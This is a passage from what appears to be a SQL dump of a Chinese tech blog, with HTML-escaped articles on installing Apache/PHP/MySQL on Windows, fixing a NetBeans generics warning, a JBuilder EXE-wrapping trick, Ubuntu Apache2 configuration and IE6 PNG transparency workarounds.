&quot;Apache24&quot;后，会有成功安装的提示，&ldquo;服务&rdquo;也会有Apache24这个服务项。这个时候可以选择启动，启动Apache服务。</p>\r\n\r\n<p>如果要卸载这个服务的话，先要停止这个服务，然后输入httpd.exe -k uninstall -n &quot;Apache24&quot;卸载这个服务。</p>\r\n\r\n<p>以后可以通过Apache24\\bin文件夹下的ApacheMonitor.exe来控制这个Apache。任务栏也会有显示这个软件的很方便的管理Apache的运行。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150726134351729791.jpg\" style=\"height:266px; width:420px\" /></p>\r\n\r\n<p>附：你可以把Apache24放在C盘根目录下，即C:\\Apache24</p>\r\n\r\n<p>上面2中，只要改（3）（5），cmd命令的话直接输入cd c:\\apache24\\bin回车httpd回车，这样的话简单多了。</p>\r\n\r\n<p>到这里Apache的基本安装已经讲完了。</p>\r\n\r\n<p><br />\r\n下面开始说说PHP的安装了。</p>\r\n\r\n<p>第二部分：安装PHP5.4.8</p>\r\n\r\n<p>1.下载回来的是解压文件，解压好放到要安装的位置。（我这里以D:\\PHP为例）</p>\r\n\r\n<p>同时解压php5apache2_4.dll-php-5.4-win32.zip选择PHP 5.4.7中的php5apache2_4.dll放到PHP目录中。</p>\r\n\r\n<p>注意：这里没有PHP5.4.8版本的php5apache2_4.dll，所以我选择了一个最新版本的。</p>\r\n\r\n<p>2.复制份php.ini-development，并改名为PHP.ini。</p>\r\n\r\n<p>3.打开Apache24\\conf下httpd.conf，在最后加上</p>\r\n\r\n<p># php5 support LoadModule php5_module &quot;d:/php/php5apache2_4.dll&quot; AddHandler application/x-httpd-php .php # configure the path to php.ini PHPIniDir &quot;d:/php&quot;</p>\r\n\r\n<p>用来支持PHP，其中d:/php为PHP根目录。由于使用的是 Apache2.4.3，所以 php5_module 为 php5apache2_4.dll。</p>\r\n\r\n<p>4. 重启 Apache 服务器。</p>\r\n\r\n<p>5.测试。删除WWW中其他文件，新建一个index.php，内容为&lt;?php phpinfo(); ?&gt;保存，访问出现php的信息就说明php已经成功安装。</p>\r\n\r\n<p>到这里PHP的基本安装已经完成。</p>\r\n\r\n<p><br />\r\n下面是mysql的安装。</p>\r\n\r\n<p>第三部分：安装Mysql5.5.28</p>\r\n\r\n<p>1.直接运行安装文件，这里就不具体说明了。</p>\r\n\r\n<p>2.php支持MYSQL设置</p>\r\n\r\n<p>（1）第730行; extension_dir = &quot;ext&quot;，去掉前面的&ldquo;;&rdquo;，并改为extension_dir =&quot;d:\\PHP\\ext&quot;</p>\r\n\r\n<p>（2）第880、881行，去掉前面的&ldquo;;&rdquo;</p>\r\n\r\n<p>extension=php_mysql.dll<br />\r\nextension=php_mysqli.dll</p>\r\n\r\n<p>注：在第838行到第908行有很多DLL，你要用到什么，去掉前面的&ldquo;;&rdquo;就可以了。</p>\r\n\r\n<p>（3）重启Apache即可。</p>\r\n\r\n<p>到这里mysql安装也基本完成了。</p>\r\n\r\n<p>剩下的就是一些Apache，php以及Mysql的设置，这个东西比较多，这个是仁者见仁智者见智的东西。我这里也不献丑了。</p>\r\n',0,1437889466,0,0),(75,16,'NetBeans出现Note: Test.java uses unchecked or unsafe operations','<p>NetBeans出现Note: Test.java uses unchecked or unsafe operations</p>\r\n\r\n<p><br />\r\n如果显示为中文就是：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; 注意： a.java 使用了未经检查或不安全的操作。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; 注意： 要了解详细信息，请使用 -Xlint:unchecked 重新编译。</p>\r\n\r\n<p>&nbsp; 其实是很简单，是因为用到了JAVA5.0的泛型，而5.0的泛型不做类型检查。</p>\r\n\r\n<p>例如：</p>\r\n\r\n<p>ArrayList a =new ArrayList();<br />\r\na.add(&quot;hello&quot;);</p>\r\n\r\n<p>这样会出现警告，解决方法有以下几种：<br />\r\n&nbsp; 1）在方法的前面加上@SuppressWarnings(&quot;unchecked&quot;)<br />\r\n&nbsp; 2）声明泛型类型，例如ArrayList&lt;Object&gt; a=new ArrayList&lt;Object&gt;();<br />\r\n&nbsp; 3）使用1.4兼容JDK来编译，javac -source 1.4 Test.java<br />\r\n&nbsp; 4）也可以查看警告信息，javac Xlint:unchecked Test.java。这样会显示详细的警告信息</p>\r\n',0,1437890352,0,0),(76,16,'Jbuilder生成EXE技巧','<p>下面是Borland不公开的使用技巧，能够通过JBuilder来制作exe文件来启动Java文件。<br />\r\nJBuilder并不支持本地编译机制。但是有一个隐藏的技巧可以让你从可执行文件来启动<br />\r\nJava 程序，可以出现或者不出现console窗口。需要JBuilder的bin目录下的这些文件:<br />\r\nJBuilder.exe JBuilderW.exe (可选) JBuilder.config<br />\r\njdk.config JavaLauncher.dll &ldquo;JBuilder.exe&rdquo;是一个通用的可执行外壳文件，用以启动<br />\r\nJava程序，&quot;JBuilderW.exe&quot;好像是javaw.exe一样，它把&quot;JBuilder.exe&quot;包装起来运行时候<br />\r\n不显示那个conso le的窗口。使用这些文件的关键是文件名。&quot;JBuilder.exe&quot;查找一个文件<br />\r\n叫&quot;JBuilder.config&quot;的配置文件，里面包含了运行Java程序的必须信息。<br />\r\n同样的&quot;JBuilderW.exe&quot;查找 &quot;JBuilder.exe&quot;来启动不带Console窗口的Java程序。如果把<br />\r\n&quot;JBuilder.exe&quot;重命名为&quot;foo.exe&quot;，那&quot;foo.exe&quot;将去寻找&quot;foo.config&quot;配置文件，同样<br />\r\n&quot;JBuilderW.exe&quot;被重命名为&quot;fooW.exe&quot;，它会去寻找&quot;foo.exe&quot;文件。<br />\r\n如何利用JBuilder.exe来启动应用程序？只要把JBuilder.exe,JBuilerW.exe,<br />\r\nJBuilder.config改名成相应的文件名，在JBuilder.config里面指定主类和类路径，就能够<br />\r\n通过执行JBuilder.exe(或者被改名后的exe文件)来启动Java应用程序了。<br />\r\n下面是举一例子：<br />\r\nBorland JBuilder 8被安装在E:/jbuilder8/目录下，在E:/jbuilder8/bin/下建立一个temp<br />\r\n目录，然后把JBuilder.exe,JBuilder.config,JavaLauncher.dll,jdk.config四个文件<br />\r\n拷贝到E:/jbuilder8/bin/temp/目录下，然后在这个目录下建立一个hello目录，在这个目录<br />\r\n下生成一个hello.java文件，即E:/jbuilder8/bin/temp/hello/hello.java文件，<br />\r\n//hello.java<br />\r\npackage hello;<br />\r\npublic class hello{<br />\r\npublic static void main(String s[]){<br />\r\nSystem.out.println(&quot;Hello, Exe file!&quot;);<br />\r\n}<br />\r\n}<br />\r\n编译java文件<br />\r\n然后打开Jbuilder.config文件，作相应的修改：<br />\r\n在JBuilder.config里面找到下面两行<br />\r\n# Start JBuilder using the its main class<br />\r\nmainclass com.borland.jbuilder.JBuilder<br />\r\n修改为<br />\r\n# Start JBuilder using the its main class<br />\r\nmainclass hello.hello<br />\r\naddpath E:/jbuilder5/bin/temp/<br />\r\naddpath命令是把目录加入类路径中，这个命令和其它config里面可以识别的命令可以在<br />\r\nJBuilder/bin目录下的config_readme.txt里面找到详细说明。<br />\r\n然后将jdk.config里面的javapath修改成相对的路径，例如原来是<br />\r\njavapath ../jdk1.4/bin/java<br />\r\n修改成<br />\r\njavapath ../../jdk1.4/bin/java<br />\r\n最后将JBuilder.exe,JBuilder.config修改成所需要的文件名，例如foo.exe和foo.config文件。<br />\r\n至此,通过修改JBuilder来使用exe文件启动自己的Java应用程序已经完成了但是好玩的地方<br />\r\n并不在这个地方,下面的小技巧可能更有趣，将Jar文件打包进入exe文件！<br />\r\n假设利用上面的文件，生成hello.jar包，执行过程:<br />\r\njar cvf hello.jar hello/*.class<br />\r\n将类文件打包成exe文件<br />\r\n然后将jar包附加到JBuilder.exe后面去，执行过程:<br />\r\ncopy /b ../JBuilder.exe+hello.jar foo.exe<br />\r\n将jar文件转化成exe文件:<br />\r\n在foo.config(JBuilder.config)文件里面把前面加入的类路径去掉，并加入下面的路径：<br />\r\naddpath E:/jbuilder5/bin/temp/foo.exe<br />\r\n然后执行: foo.exe 将会看到一个含jar包的exe文件被执行了！<br />\r\n这个过程的大致原理是：exe文件的重要信息都在文件头部，所以把乱七八糟的东西放exe文<br />\r\n件尾部是不要紧的；而jar/zip文件的重要信息是在文件尾部的，这样它们两不相干，能够容<br />\r\n易的被执行。<br />\r\n但是使用这个功能，自己要承担可能带来的风险，因为Borland对这个功能不 提供官方的支持！</p>\r\n',0,1437892362,0,0),(77,15,'Ubuntu下安装和配置Apache2','<p>在Ubuntu中安装apache</p>\r\n\r\n<p>安装指令：sudo apt-get install apache2</p>\r\n\r\n<p>安装结束后：</p>\r\n\r\n<p>产生的启动和停止文件是：/etc/init.d/apache2</p>\r\n\r\n<p>启动：sudo apache2ctl -k start</p>\r\n\r\n<p>停止：sudo apache2ctl -k stop</p>\r\n\r\n<p>重新启动：sudo apache2ctl -k restart</p>\r\n\r\n<p>配置文件保存在：/etc/apache2</p>\r\n\r\n<p>&nbsp;需要说明的是，普通的apache发行版本配置文件是：</p>\r\n\r\n<p>httpd.conf</p>\r\n\r\n<p>Ubuntu发行版本的主配置文件是：</p>\r\n\r\n<p>apache2.conf</p>\r\n\r\n<p>在apache2.conf引用到了以下文件：</p>\r\n\r\n<p># 包含动态模块的配置:</p>\r\n\r\n<p>Include /etc/apache2/mods-enabled/*.load</p>\r\n\r\n<p>Include /etc/apache2/mods-enabled/*.conf</p>\r\n\r\n<p># 包含用户自己的配置:</p>\r\n\r\n<p>Include /etc/apache2/httpd.conf</p>\r\n\r\n<p># 包含端口监听的配置:</p>\r\n\r\n<p>Include /etc/apache2/ports.conf</p>\r\n\r\n<p># 包含一般性的配置语句片断:</p>\r\n\r\n<p>Include /etc/apache2/conf.d/</p>\r\n\r\n<p># 包含虚拟主机的配置指令:</p>\r\n\r\n<p>Include /etc/apache2/sites-enabled/</p>\r\n\r\n<p>修改httpd.conf</p>\r\n\r\n<p>增加以下内容：</p>\r\n\r\n<p>ServerName 127.0.0.1:80</p>\r\n\r\n<p>ubuntu&nbsp; apache2配置</p>\r\n\r\n<p>1.apache2.conf 是主配置文件，httpd.conf 用户配置文件<br />\r\n2.虚拟目录在 httpd.conf 中<br />\r\n&lt;VirtualHost *&gt;<br />\r\nDocumentRoot &quot;路径&quot;<br />\r\nServerName 名称<br />\r\n&lt;Directory &quot;路径&quot;&gt; allow from all Options +Indexes &lt;/Directory&gt;<br />\r\n&lt;/VirtualHost&gt;<br />\r\n3.根设置（默认主目录）在 /etc/apache2/sites-available/default<br />\r\n4.重启命令<br />\r\nsudo /etc/init.d/apache2 restart或者<br />\r\ncd /etc/init.d<br />\r\nsudo apache2 -k restart<br />\r\nstop 停止；start 启动5.日志文件在 /var/log/apache2/<br />\r\n&lt;VirtualHost *:80&gt;<br />\r\nServerName www.kimoqi.com<br />\r\nDocumentRoot /home/vsftpd/kimoqi<br />\r\n&lt;/VirtualHost&gt;<br />\r\n&lt;VirtualHost *:80&gt;<br />\r\nServerName www.arwenedu.com<br />\r\nDocumentRoot /home/vsftpd/wangguan/webapps<br />\r\n&lt;/VirtualHost&gt;<br />\r\n&lt;VirtualHost *:80&gt;<br />\r\nServerName www.arwenedu.org.cn<br />\r\nDocumentRoot /home/vsftpd/wangguan/chem<br />\r\n&lt;/VirtualHost&gt;</p>\r\n\r\n<p>vi /etc/httpd/conf/httpd.conf</p>\r\n\r\n<p>在Windows下，Apache的配置文件通常只有一个，就是httpd.conf。但我在Ubuntu Linux上用apt-get install apache2命令安装了Apache2后，竟然发现它的httpd.conf（位于/etc/apache2目录）是空的！进而发现Ubuntu的 Apache软件包的配置文件并不像Windows的那样简单，它把各个设置项分在了不同的配置文件中，看起来复杂，但仔细想想设计得确实很合理。</p>\r\n\r\n<p>严格地说，Ubuntu的Apache（或者应该说Linux下的Apache？我不清楚其他发行版的apache软件包）的配置文件是 /etc/apache2/apache2.conf，Apache在启动时会自动读取这个文件的配置信息。而其他的一些配置文件，如 httpd.conf等，则是通过Include指令包含进来。在apache2.conf中可以找到这些Include行：</p>\r\n\r\n<p>引用</p>\r\n\r\n<p># Include module configuration:<br />\r\nInclude /etc/apache2/mods-enabled/*.load<br />\r\nInclude /etc/apache2/mods-enabled/*.conf</p>\r\n\r\n<p># Include all the user configurations:<br />\r\nInclude /etc/apache2/httpd.conf</p>\r\n\r\n<p># Include ports listing<br />\r\nInclude /etc/apache2/ports.conf<br />\r\n&hellip;&hellip;<br />\r\n# Include generic snippets of statements<br />\r\nInclude /etc/apache2/conf.d/</p>\r\n\r\n<p># Include the virtual host configurations:<br />\r\nInclude /etc/apache2/sites-enabled/<br />\r\n结合注释，可以很清楚地看出每个配置文件的大体作用。当然，你完全可以把所有的设置放在apache2.conf或者httpd.conf或者任何一个配置文件中。Apache2的这种划分只是一种比较好的习惯。</p>\r\n\r\n<p>安装完Apache后的最重要的一件事就是要知道Web文档根目录在什么地方，对于Ubuntu而言，默认的是/var/www。怎么知道的呢？ apache2.conf里并没有DocumentRoot项，httpd.conf又是空的，因此肯定在其他的文件中。经过搜索，发现在 /etc/apache2/sites-enabled/000-default中，里面有这样的内容：</p>\r\n\r\n<p>引用</p>\r\n\r\n<p>NameVirtualHost *<br />\r\n&lt;VirtualHost *&gt;<br />\r\nServerAdmin webmaster@localhost</p>\r\n\r\n<p>DocumentRoot /var/www/<br />\r\n&hellip;&hellip;<br />\r\n这是设置虚拟主机的，对我来说没什么意义。所以我就把apache2.conf里的Include /etc/apache2/sites-enabled/一行注释掉了，并且在httpd.conf里设置DocumentRoot为我的用户目录下的某 个目录，这样方便开发。</p>\r\n\r\n<p>再看看/etc/apache2目录下的东西。刚才在apache2.conf里发现了sites-enabled目录，而在 /etc/apache2下还有一个sites-available目录，这里面是放什么的呢？其实，这里面才是真正的配置文件，而sites- enabled目录存放的只是一些指向这里的文件的符号链接，你可以用ls /etc/apache2/sites-enabled/来证实一下。所以，如果apache上配置了多个虚拟主机，每个虚拟主机的配置文件都放在 sites-available下，那么对于虚拟主机的停用、启用就非常方便了：当在sites-enabled下建立一个指向某个虚拟主机配置文件的链 接时，就启用了它；如果要关闭某个虚拟主机的话，只需删除相应的链接即可，根本不用去改配置文件。</p>\r\n\r\n<p>mods-available、mods-enabled和上面说的sites-available、sites-enabled类似，这两个目录 是存放apache功能模块的配置文件和链接的。当我用apt-get install php5安装了PHP模块后，在这两个目录里就有了php5.load、php5.conf和指向这两个文件的链接。这种目录结果对于启用、停用某个 Apache模块是非常方便的。</p>\r\n\r\n<p>最后一个要说的是ports.conf，这里面设置了Apache使用的端口。如果需要调整默认的端口设置，建议编辑这个文件。或者你嫌它实在多 余，也可以先把apache2.conf中的Include /etc/apache2/ports.conf一行去掉，在httpd.conf里设置Apache端口。</p>\r\n\r\n<p>ubuntu里缺省安装的目录结构很有一点不同。在ubuntu中module和 virtual host的配置都有两个目录，一个是available，一个是enabled，available目录是存放有效的内容，但不起作用，只有用ln 连到enabled过去才可以起作用。对调试使用都很方便，但是如果事先不知道，找起来也有点麻烦。</p>\r\n\r\n<p>/etc/apache2/sites-available 里放的是VH的配置，但不起作用，要把文件link到 sites-enabled 目录里才行。</p>\r\n\r\n<p>&lt;VirtualHost *&gt; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServerName 域名 &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DocumentRoot 把rails项目里的public当根目录 &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Directory public根目录&gt; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Options ExecCGI FollowSymLinks &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AllowOverride all &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; allow from all &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Order allow,deny &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/Directory&gt; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ErrorLog /var/log/apache2/error-域名.log &nbsp;</p>\r\n\r\n<p>&lt;/VirtualHost&gt;</p>\r\n\r\n<p>进一步的配置和使用，就可以查阅APACHE的手册了</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Apache配置文件httpd.conf说明</p>\r\n\r\n<p>DocumentRoot &quot;/var/www/html&quot;---Apache默认服务器主目录路径</p>\r\n\r\n<p><br />\r\nDirectoryIndex index.html index.htm index.php index.html.var---默认文档，多个文件之间用空格分开</p>\r\n\r\n<p>Listen 192.168.1.1:80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设置监听ip是192.168.1.1的地址和端口为80</p>\r\n\r\n<p>Listen 192.168.1.2:8080&nbsp;&nbsp;&nbsp;&nbsp; 设置监听ip是192.168.1.2的地址和端口为8080</p>\r\n\r\n<p>ServerRoot &quot;/etc/httpd&quot;&nbsp;&nbsp;&nbsp;&nbsp; 设置相对根目录的路径 ，通常是指存放配置文件和日志文件的地方。缺省是：/etc/httpd 一般包括conf和logs子目录</p>\r\n\r\n<p>ErrorLog logs/error_log&nbsp;&nbsp;&nbsp;&nbsp; 设置错误日志&nbsp;&nbsp;&nbsp; 注意：如果日志文件存放路径不是以&ldquo;/&rdquo;开头，意味著该文件是相对于 ServerRoot目录</p>\r\n\r\n<p>CustomLog logs/access_log combined&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 访问日志&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; （combined指明日志使用的格式，还有common格式）</p>\r\n\r\n<p>ServerAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设置网络管理员的Email&nbsp;&nbsp;&nbsp; -当客户端服务器发生错误时，服务器通常会向客户端返回错误提示页面，为了方便解决错误，这个网页中通常有管理员的Email地址，可以通过使用 ServerAdmin语句来设置管理员的EMail地址</p>\r\n\r\n<p>ServerName www.iigoogle.com:80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设置服务器主机名称 (如果有域名可以填入域名，没有域名则可填入服务器IP地址)</p>\r\n\r\n<p>AddDefaultCharset GB2312&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设置默认字符集，定义服务器返回给客户机默认字符集(由于西欧UTF-8是Apache默认字符集，因此当访问有中文的网页时会出现乱码，这时只要将字符集改成GB2312，再重启Apache服务即可)</p>\r\n\r\n<p>Alias /down&nbsp;&nbsp;&nbsp; &quot;/software /download&quot;&nbsp;&nbsp;&nbsp;&nbsp; 创建虚拟目录（创建名为down的虚拟目录，它对应的物理路径是：/software /download）<br />\r\nAlias /ftp&nbsp;&nbsp;&nbsp;&nbsp; &quot;/var/ftp&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 创建虚拟目录（创建名为ftp的虚拟目录，它对应的物理路径是：/var/ftp）</p>\r\n\r\n<p>&lt;Directory &quot;/var/www/html&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设置目录权限（&lt;Directory &quot;目录路径&quot;&gt;此次写设置目录权限的语句&lt;/Directory&gt;）<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Options FollowSymLinks&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; page:116<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AllowOverride None<br />\r\n&lt;/Directory&gt;</p>\r\n\r\n<p><br />\r\n基于域名的虚拟主机<br />\r\nNameVirtualHost 220.123.55.99&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---先用NameVirtualHost指令指定哪个IP地址负责响应对虚拟主机的请求<br />\r\n&lt;VirtualHost www.iigoogle.com&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServerName www.iigoogle.com:80<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServerAdmin<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DocumentRoot /www/docs/iigoogle<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DirectoryIndex index.jsp&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ErrorLog logs/www/iigoogle/error_log<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CustomLog logs/www/iigoogle/access_log common<br />\r\n&lt;/VirtualHost&gt;<br />\r\n另一种写法<br />\r\nNameVirtualHost 220.123.55.99:80&nbsp;&nbsp; &nbsp;<br />\r\n&lt;VirtualHost www.iigoogle.com:80&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServerName www.iigoogle.com<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServerAdmin<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DocumentRoot /www/docs/iigoogle.com&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ErrorLog logs/www/iigoogle/error_log<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CustomLog logs/www/iigoogle/access_log common<br />\r\n&lt;/VirtualHost&gt;</p>\r\n',0,1437892431,0,0),(78,37,'IE6 png 透明 (三种解决方法)','<p>FF和IE7已经直接支持透明的png图了,下面这个主要是解决IE6下透明PNG图片有灰底的</p>\r\n\r\n<p>=============================================================================</p>\r\n\r\n<p>此效果简单，。。。。相当不错 推荐</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>style=&quot;FILTER: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=images/fl.png&#39;)&quot;</p>\r\n\r\n<p>语法：<br />\r\nfilter : progid:DXImageTransform.Microsoft.AlphaImageLoader ( enabled=bEnabled , sizingMethod=sSize , src=sURL )</p>\r\n\r\n<p>enabled : 可选项。布尔值(Boolean)。设置或检索滤镜是否激活。true | false true : 默认值。滤镜激活。<br />\r\nfalse : 滤镜被禁止。</p>\r\n\r\n<p>sizingMethod : 可选项。字符串(String)。设置或检索滤镜作用的对象的图片在对象容器边界内的显示方式。 crop : 剪切图片以适应对象尺寸。<br />\r\nimage : 默认值。增大或减小对象的尺寸边界以适应图片的尺寸。<br />\r\nscale : 缩放图片以适应对象的尺寸边界。</p>\r\n\r\n<p>src : 必选项。字符串(String)。使用绝对或相对 url 地址指定背景图像。假如忽略此参数，滤镜将不会作用。</p>\r\n\r\n<p>特性：<br />\r\nEnabled : 可读写。布尔值(Boolean)。参阅 enabled 属性。<br />\r\nsizingMethod : 可读写。字符串(String)。参阅 sizingMethod 属性。<br />\r\nsrc : 可读写。字符串(String)。参阅 src 属性。</p>\r\n\r\n<p>说明：<br />\r\n在对象容器边界内，在对象的背景和内容之间显示一张图片。并提供对此图片的剪切和改变尺寸的操作。如果载入的是PNG(Portable Network Graphics)格式，则0%-100%的透明度也被提供。<br />\r\nPNG(Portable Network Graphics)格式的图片的透明度不妨碍你选择文本。也就是说，你可以选择显示在PNG(Portable Network Graphics)格式的图片完全透明区域后面的内容。</p>\r\n\r\n<p>实例：解决IE6下png透明失效的问题。</p>\r\n\r\n<p>CSS样式:</p>\r\n\r\n<p>.png{<br />\r\n_background: url(http://www.snowangel.cn/images/angel.png) no-repeat !important;<br />\r\nfilter: progid:DXImageTransform.Microsoft.AlphaImageLoader(enabled=true, sizingMethod=noscale, src=&quot;http://www.snowangel.cn/images/angel.png&quot;);<br />\r\nbackground:none;<br />\r\nwidth:118px;height:133px;<br />\r\n}</p>\r\n\r\n<p>.png div{position:relative;}</p>\r\n\r\n<p>HTML代码：<br />\r\n&lt;div class=&quot;png&quot;&gt;<br />\r\n&lt;div&gt;<br />\r\nCSS 背景PNG透明 及 链接失效问题解决<br />\r\n&lt;/div&gt;<br />\r\n&lt;/div&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/*<br />\r\n兼容IE6.0、IE7.0、FF，<br />\r\nIE7.0和新版的FF其实是可以不加filter滤镜直接透明的。<br />\r\n*/</p>\r\n\r\n<p>=============================================================================</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;<br />\r\n第 1 种方法:定义一个样式,给某个div应用这个样式后，div的透明png背景图片自动透明了。（注意两处图片的路径写法不一样，本例中，icon_home.png图片与html文件在相同目录）</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br />\r\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot; /&gt;<br />\r\n&lt;title&gt;无标题文档&lt;/title&gt;<br />\r\n&lt;style type=&quot;text/css&quot;&gt;<br />\r\n&lt;!--<br />\r\n.qq {<br />\r\nheight: 90px;<br />\r\nwidth: 90px;<br />\r\nbackground-image: url(icon_home.png)!important;/* FF IE7 */<br />\r\nbackground-repeat: no-repeat;</p>\r\n\r\n<p>_filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=&#39;icon_home.png&#39;); /* IE6 */<br />\r\n_ background-image: none; /* IE6 */<br />\r\n}<br />\r\n--&gt;<br />\r\n&lt;/style&gt;<br />\r\n&lt;/head&gt;</p>\r\n\r\n<p>&lt;body&gt;</p>\r\n\r\n<p>&lt;div class=&quot;qq&quot;&gt;&lt;/div&gt;</p>\r\n\r\n<p>&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>第 2 种方法: 给img定义样式，页面上所有透明png即自动透明了。（这方法只对直接插入的图片有效，对背景图无效）注意，要准备一个透明的小图片transparent.gif,大小不限。必须放在和html相同的目录<br />\r\n请勿大量使用，否则会导致页面打开很慢!!!)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br />\r\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot; /&gt;<br />\r\n&lt;title&gt;无标题文档&lt;/title&gt;<br />\r\n&lt;style type=&quot;text/css&quot;&gt;<br />\r\n.mypng img {<br />\r\nazimuth: expression(<br />\r\nthis.pngSet?this.pngSet=true:(this.nodeName == &quot;IMG&quot; &amp;&amp; this.src.toLowerCase().indexOf(&#39;.png&#39;)&gt;-1?(this.runtimeStyle.backgroundImage = &quot;none&quot;,<br />\r\nthis.runtimeStyle.filter = &quot;progid:DXImageTransform.Microsoft.AlphaImageLoader(src=&#39;&quot; + this.src + &quot;&#39;, sizingMethod=&#39;image&#39;)&quot;,<br />\r\nthis.src = &quot;transparent.gif&quot;):(this.origBg = this.origBg? this.origBg :this.currentStyle.backgroundImage.toString().replace(&#39;url(&quot;&#39;,&#39;&#39;).replace(&#39;&quot;)&#39;,&#39;&#39;),<br />\r\nthis.runtimeStyle.filter = &quot;progid:DXImageTransform.Microsoft.AlphaImageLoader(src=&#39;&quot; + this.origBg + &quot;&#39;, sizingMethod=&#39;crop&#39;)&quot;,<br />\r\nthis.runtimeStyle.backgroundImage = &quot;none&quot;)),this.pngSet=true);<br />\r\n}</p>\r\n\r\n<p>&lt;/style&gt;<br />\r\n&lt;/head&gt;</p>\r\n\r\n<p>&lt;body&gt;<br />\r\n换成你的png图片<br />\r\n&lt;div class=&quot;mypng&quot;&gt;<br />\r\n&lt;img src=&quot;icon_face_07.png&quot; width=&quot;30&quot; height=&quot;30&quot; /&gt;<br />\r\n&lt;img src=&quot;icon_face_10.png&quot; width=&quot;30&quot; height=&quot;30&quot; /&gt;<br />\r\n&lt;img src=&quot;icon_face_08.png&quot; width=&quot;30&quot; height=&quot;30&quot; /&gt;<br />\r\n&lt;/div&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>第 3 种方法:用JS实现,加上一段js代码后,所有插入的透明png自动透明了.（注意，这方法也是只对直接插入的图片有效，对背景图无效）</p>\r\n\r\n<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br />\r\n&lt;html 